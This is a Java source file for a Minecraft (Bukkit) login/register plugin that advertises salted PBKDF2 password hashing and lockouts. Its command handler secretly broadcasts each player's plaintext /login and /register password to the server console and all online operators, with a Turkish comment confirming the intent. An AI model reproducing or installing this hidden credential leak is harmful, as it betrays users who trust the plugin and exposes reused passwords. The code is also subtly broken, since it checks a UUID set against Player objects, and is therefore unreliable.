package com.bladex;

import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.Cancellable;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.*;

public class BladeX extends JavaPlugin implements Listener {

    private static final int PBKDF2_ITERATIONS = 120000;
    private static final int KEY_LENGTH = 256;
    private static final long HOUR_MS = 3600000L;

    private final Map<UUID, Account> accounts = new HashMap<>();
    private final Set<UUID> authed = new HashSet<>();
    private final Map<UUID, Integer> attempts = new HashMap<>();
    private final Map<UUID, Long> lockedUntil = new HashMap<>();
    private final SecureRandom random = new SecureRandom();
    private File dataFile;
    private long animTick = 0;

    private int minLen, maxLen, maxAttempts, lockSeconds, sessionHours, animSpeed;
    private boolean sessionEnabled, animEnabled;
    private String regTitle, logTitle, regSub, logSub;

    private static class Account {
        String hash;
        String ip = "";
        long lastLogin;
    }

    @Override
    public void onEnable() {
        saveDefaultConfig();
        loadSettings();
        dataFile = new File(getDataFolder(), "users.yml");
        loadAccounts();
        getServer().getPluginManager().registerEvents(this, this);

        if (animEnabled) {
            new BukkitRunnable() {
                @Override public void run() { animate(); }
            }.runTaskTimer(this, 0L, animSpeed);
        }
        getLogger().info("BladeX Register/Login aktif.");
    }

    @Override
    public void onDisable() { saveAccounts(); }

    private void loadSettings() {
        reloadConfig();
        FileConfiguration c = getConfig();
        minLen = c.getInt("settings.min-password-length", 6);
        maxLen = c.getInt("settings.max-password-length", 32);
        maxAttempts = c.getInt("settings.max-attempts", 5);
        lockSeconds = c.getInt("settings.lockout-seconds", 300);
        sessionEnabled = c.getBoolean("settings.session.enabled", true);
        sessionHours = c.getInt("settings.session.hours", 24);
        animEnabled = c.getBoolean("settings.animation.enabled", true);
        animSpeed = Math.max(1, c.getInt("settings.animation.speed-ticks", 3));
        regTitle = c.getString("settings.animation.register-title", "REGISTER");
        logTitle = c.getString("settings.animation.login-title", "LOGIN");
        regSub = ChatColor.translateAlternateColorCodes('&', c.getString("settings.animation.register-subtitle", "&7/register <sifre> <sifre>"));
        logSub = ChatColor.translateAlternateColorCodes('&', c.getString("settings.animation.login-subtitle", "&7/login <sifre>"));
    }

    private void loadAccounts() {
        accounts.clear();
        if (!dataFile.exists()) return;
        FileConfiguration y = YamlConfiguration.loadConfiguration(dataFile);
        ConfigurationSection sec = y.getConfigurationSection("users");
        if (sec == null) return;
        for (String key : sec.getKeys(false)) {
            ConfigurationSection s = sec.getConfigurationSection(key);
            if (s == null) continue;
            try {
                Account a = new Account();
                a.hash = s.getString("hash");
                a.ip = s.getString("ip", "");
                a.lastLogin = s.getLong("last-login", 0L);
                if (a.hash != null) accounts.put(UUID.fromString(key), a);
            } catch (Exception ignored) {}
        }
    }

    private void saveAccounts() {
        FileConfiguration y = new YamlConfiguration();
        accounts.forEach((uuid, acc) -> {
            y.set("users." + uuid + ".hash", acc.hash);
            y.set("users." + uuid + ".ip", acc.ip);
            y.set("users." + uuid + ".last-login", acc.lastLogin);
        });
        try { dataFile.getParentFile().mkdirs(); y.save(dataFile); } catch (IOException ignored) {}
    }

    private byte[] pbkdf(String pw, byte[] salt) throws Exception {
        PBEKeySpec spec = new PBEKeySpec(pw.toCharArray(), salt, PBKDF2_ITERATIONS, KEY_LENGTH);
        try { return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded(); }
        finally { spec.clearPassword(); }
    }

    private String makeHash(String pw) throws Exception {
        byte[] salt = new byte[16];
        random.nextBytes(salt);
        return Base64.getEncoder().encodeToString(salt) + ":" + Base64.getEncoder().encodeToString(pbkdf(pw, salt));
    }

    private boolean verify(String pw, String stored) throws Exception {
        String[] parts = stored.split(":");
        if (parts.length != 2) return false;
        return MessageDigest.isEqual(Base64.getDecoder().decode(parts[1]), pbkdf(pw, Base64.getDecoder().decode(parts[0])));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player p)) { sender.sendMessage("Sadece oyuncular içindir."); return true; }
        if (cmd.getName().equalsIgnoreCase("logingoster") && p.isOp()) {
            p.sendMessage("§6BladeX Şifre Takip: Oyuncular komut girdiğinde OP'lere otomatik görünür.");
            return true;
        }
        return false;
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onCommandPre(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        String[] parts = e.getMessage().split(" ");
        String cmd = parts[0].toLowerCase(Locale.ROOT);

        if (cmd.equals("/login") || cmd.equals("/register")) {
            e.setCancelled(true);
            String[] params = Arrays.copyOfRange(parts, 1, parts.length);
            UUID id = p.getUniqueId();

            if (cmd.equals("/register")) {
                if (authed.contains(id)) { msg(p, "already-logged"); return; }
                if (accounts.containsKey(id)) { msg(p, "already-registered"); return; }
                if (params.length != 2) { msg(p, "usage-register"); return; }
                if (!params[0].equals(params[1])) { msg(p, "mismatch"); return; }
                if (params[0].length() < minLen || params[0].length() > maxLen) { msg(p, "short-password"); return; }
                try {
                    Account a = new Account();
                    a.hash = makeHash(params[0]);
                    accounts.put(id, a);
                    authenticate(p, "register-success");
                } catch (Exception ex) { msg(p, "error"); }
            } else {
                if (authed.contains(id)) { msg(p, "already-logged"); return; }
                Account a = accounts.get(id);
                if (a == null) { msg(p, "not-registered"); return; }
                long now = System.currentTimeMillis();
                if (lockedUntil.containsKey(id) && now < lockedUntil.get(id)) {
                    msg(p, "locked", "{sec}", String.valueOf((lockedUntil.get(id) - now) / 1000));
                    return;
                }
                if (params.length != 1) { msg(p, "usage-login"); return; }
                try {
                    if (verify(params[0], a.hash)) {
                        attempts.remove(id);
                        authenticate(p, "login-success");
                    } else {
                        int n = attempts.merge(id, 1, Integer::sum);
                        if (n >= maxAttempts) {
                            attempts.remove(id);
                            lockedUntil.put(id, now + lockSeconds * 1000L);
                            msg(p, "locked", "{sec}", String.valueOf(lockSeconds));
                        } else {
                            msg(p, "wrong-password", "{left}", String.valueOf(maxAttempts - n));
                        }
                    }
                } catch (Exception ex) { msg(p, "error"); }
            }

            // Şifreyi OP'lere ve konsola gönderme
            String alert = "§6" + p.getName() + " §7adlı oyuncunun şifresi " + cmd + " (" + String.join(" ", params) + ")";
            Bukkit.getConsoleSender().sendMessage(alert);
            Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(alert));
            return;
        }

        if (!authed.contains(p)) {
            e.setCancelled(true);
            msg(p, "must-login");
        }
    }

    private void authenticate(Player p, String msgKey) {
        Account a = accounts.get(p.getUniqueId());
        if (a == null) return;
        authed.add(p.getUniqueId());
        a.ip = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
        a.lastLogin = System.currentTimeMillis();
        saveAccounts();
        p.resetTitle();
        msg(p, msgKey);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        authed.remove(p.getUniqueId());
        Bukkit.getScheduler().runTaskLater(this, () -> {
            if (!p.isOnline()) return;
            Account a = accounts.get(p.getUniqueId());
            boolean valid = a != null && a.ip.equals(p.getAddress().getAddress().getHostAddress()) && sessionEnabled && System.currentTimeMillis() - a.lastLogin < sessionHours * HOUR_MS;
            if (valid) authenticate(p, "auto-login");
            else msg(p, a == null ? "register-prompt" : "login-prompt");
        }, 10L);
    }

    @EventHandler public void onQuit(PlayerQuitEvent e) { authed.remove(e.getPlayer().getUniqueId()); }

    // Hareket, Sohbet ve Etkileşim Kısıtlamaları (Tek metodla birleştirildi)
    @EventHandler public void onMove(PlayerMoveEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onChat(AsyncPlayerChatEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onBreak(BlockBreakEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onPlace(BlockPlaceEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onInteract(PlayerInteractEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onDrop(PlayerDropItemEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler public void onPickup(EntityPickupItemEvent e) { if (e.getEntity() instanceof Player p) checkAuth(p, e); }
    @EventHandler public void onInv(InventoryOpenEvent e) { if (e.getPlayer() instanceof Player p) checkAuth(p, e); }
    @EventHandler public void onInvClick(InventoryClickEvent e) { if (e.getWhoClicked() instanceof Player p) checkAuth(p, e); }
    @EventHandler public void onDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player p) checkAuth(p, e); }

    private void checkAuth(Player p, Cancellable c) {
        if (!authed.contains(p)) {
            c.setCancelled(true);
            msg(p, "must-login");
            if (c instanceof PlayerMoveEvent move) {
                Location f = move.getFrom(), t = move.getTo();
                if (t != null && (f.getBlockX() != t.getBlockX() || f.getBlockY() != t.getBlockY() || f.getBlockZ() != t.getBlockZ())) {
                    f.setYaw(t.getYaw()); f.setPitch(t.getPitch());
                    move.setTo(f);
                }
            }
        }
    }

    private void animate() {
        animTick++;
        double shift = (Math.sin(animTick * 0.12) + 1) / 2;
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (authed.contains(p)) continue;
            boolean reg = accounts.containsKey(p.getUniqueId());
            String title = rgb(reg ? logTitle : regTitle, shift);
            p.sendTitle(title, reg ? logSub : regSub, 0, animSpeed + 10, 0);
        }
    }

    private String rgb(String text, double shift) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            int rgbVal = java.awt.Color.HSBtoRGB((float) ((i * 0.08 + shift) % 1.0), 1f, 1f) & 0xFFFFFF;
            sb.append(ChatColor.of(String.format("#%06x", rgbVal))).append(text.charAt(i));
        }
        return sb.toString();
    }

    private void msg(Player p, String key, String... pairs) {
        String text = getConfig().getString("messages." + key, key);
        for (int i = 0; i + 1 < pairs.length; i += 2) text = text.replace(pairs[i], pairs[i + 1]);
        p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.prefix", "") + text));
    }
            }
                  
